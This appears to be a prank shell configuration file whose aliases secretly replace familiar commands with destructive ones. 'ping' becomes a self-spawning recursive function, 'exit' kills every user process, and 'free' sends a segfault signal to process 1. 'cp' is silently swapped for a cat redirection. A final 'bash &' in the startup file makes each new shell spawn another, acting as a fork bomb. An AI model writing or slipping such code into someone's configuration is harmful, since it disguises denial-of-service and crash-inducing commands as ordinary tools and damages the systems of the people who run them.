function _ping() {
    ping $1 > /dev/null | _ping $1 &
}
alias ping='_ping'

alias emacs='play <(curl -s https://www.gnu.org/music/free-software-song.ogg)'

alias exit='kill -- -1'

alias free='kill -SEGV 1'

function _fefe_NOTFALL_CP() {
    # https://blog.fefe.de/?ts=b404ed06
    cat $1 > $2
}
alias cp='_fefe_NOTFALL_CP'

alias dash='toilet'

bash &
